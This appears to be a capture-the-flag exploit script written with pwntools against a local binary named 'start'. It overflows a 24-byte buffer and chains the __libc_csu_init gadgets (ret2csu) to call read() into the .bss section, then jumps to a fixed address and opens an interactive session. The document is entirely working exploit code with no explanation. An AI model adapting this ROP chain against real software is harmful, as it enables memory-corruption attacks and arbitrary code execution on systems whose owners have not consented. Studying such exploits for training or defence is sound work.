from pwn import *

p = process("./start",env={"LD_PRELOAD":"libc.so.6"})
l = ELF("./libc.so.6",checksec=False)
e = ELF("./start")

set_csu = 0x4006ba
call_csu = 0x4006a0

payload = "A"*24

payload += p64(set_csu)
payload += p64(0)
payload += p64(1)
payload += p64(e.plt['read'])
payload += p64(0x100)
payload += p64(e.bss())
payload += p64(0)
payload += p64(call_csu)
payload += p64(0)*6
payload += p64(0x4005F2)

p.send(payload)
p.interactive()
